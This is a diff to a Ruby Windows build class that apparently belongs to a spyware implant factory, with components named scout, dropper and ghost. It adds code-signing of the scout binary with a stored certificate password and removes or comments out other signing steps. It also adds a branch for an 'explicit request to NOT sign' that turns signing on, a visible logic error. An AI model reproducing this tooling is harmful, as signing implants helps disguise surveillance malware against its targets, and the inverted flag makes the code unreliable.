@@ -53,6 +53,9 @@ class BuildWindows < Build
       end
     end
 
+    # sign the scout
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('scout')}" if to_be_signed?(params)
+
     # calculate the function name for the dropper
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
@@ -191,7 +194,7 @@ class BuildWindows < Build
     return if @cooked or @melted
 
     # perform the signature
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
+    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
   end
 
   def pack(params)
@@ -248,9 +251,6 @@ class BuildWindows < Build
         raise "Ghost marker not found: #{e.message}"
       end
     end
-
-    # perform the signature
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('ghost')}" if to_be_signed?(params)
   end
 
   private
@@ -339,7 +339,7 @@ class BuildWindows < Build
     File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
   end
 
-  def to_be_signed?(params)
+  def to_be_signed?(params = nil)
     # default case
     do_signature = false
 
@@ -351,6 +351,11 @@ class BuildWindows < Build
     # explicit request to sign the code
     if not params.nil? and params['sign']
       raise "Cannot find pfx file" unless File.exist? Config.instance.cert("windows.pfx")
+      do_signature = true
+    end
+
+    # explicit request to NOT sign the code
+    if not params.nil? and params['sign'] == false
       do_signature = true
     end
 
